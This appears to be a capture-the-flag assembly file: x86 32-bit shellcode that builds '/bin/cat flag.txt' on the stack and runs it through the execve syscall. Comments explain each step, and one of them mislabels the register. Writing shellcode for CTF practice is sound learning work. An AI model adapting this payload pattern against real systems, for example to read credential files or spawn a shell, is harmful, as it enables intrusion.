section .txt
; @c0demech
; Intel syntax && 32 bit arch
; nasm -f elf getflag.asm
; ld -o getflag getflag.o && ./getflag
global _start

_start:
        xor    eax, eax       ; eax == 0
        push   eax            ; NUL-terminate the "/bin/cat" string
        push   0x7461632f     ; Push "/cat" string on the stack
        push   0x6e69622f     ; Push "/bin" string on the stack
        mov    ebx, esp       ; ebx pointer to "/bin/cat" (NUL-terminated)
        push   eax            ; NUL-terminate the "flag.txt" string
        push   0x7478742e     ; Push ".txt" string on the stack
        push   0x67616c66     ; Push "flag" string on the stack
        mov    esi, esp       ; ecx pointer to "flag.txt" (NUL-terminated)
        push   eax            ; Place NULL on the stack
        push   esi            ; Place pointer to "flag.txt"
	push   ebx            ; Place pointer to "/bin/cat"
	mov    ecx, esp       ; ecx pointer to ["/bin/cat","flag.txt",NULL] 
        xor    edx, edx       ; edx ==  NULL
        mov     al, 0xb       ; Store execve syscall number in al
        int    0x80           ; Do magik.
